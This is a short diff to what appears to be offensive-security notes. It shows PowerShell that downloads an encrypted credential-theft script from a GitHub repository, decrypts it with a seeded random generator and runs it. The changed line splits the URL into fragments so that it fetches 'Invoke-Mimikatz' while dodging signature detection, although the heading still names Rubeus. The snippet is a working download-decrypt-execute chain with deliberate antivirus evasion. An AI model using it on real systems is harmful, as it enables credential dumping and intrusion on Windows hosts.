@@ -107,7 +107,7 @@ for($i=0;$i -lt $Bytes.Length;$i++)
 
 ### Decrypt and invoke Invoke-Rubeus.ps1 in PowerShell
 ```powershell
-$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/okazymyrov/piki/blob/master/Invoke-Rubeus.ps1.encrypted?raw=true')
+$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/' + 'okazymyrov/piki' + '/blob/master/Invoke' + '-Mimi' + 'katz.ps1.encrypted?raw=true')
 $Seed = 42 # seed between 0 and 2147483647
 
 Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
